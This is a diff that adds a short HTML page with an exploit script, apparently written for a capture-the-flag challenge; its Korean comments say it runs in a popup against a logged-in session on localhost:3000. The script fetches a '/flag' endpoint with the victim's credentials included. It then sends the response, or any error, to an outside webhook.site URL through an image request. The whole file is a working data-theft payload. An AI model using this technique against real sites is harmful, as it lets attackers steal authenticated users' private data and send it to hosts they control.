@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// 이 페이지는 popup 안에서 실행됨
+// localhost:3000에 로그인된 상태에서 flag fetch
+fetch('http://localhost:3000/flag', {credentials: 'include'})
+  .then(r => r.text())
+  .then(f => {
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(f);
+  })
+  .catch(e => {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  });
+</script>
+</body>
+</html>
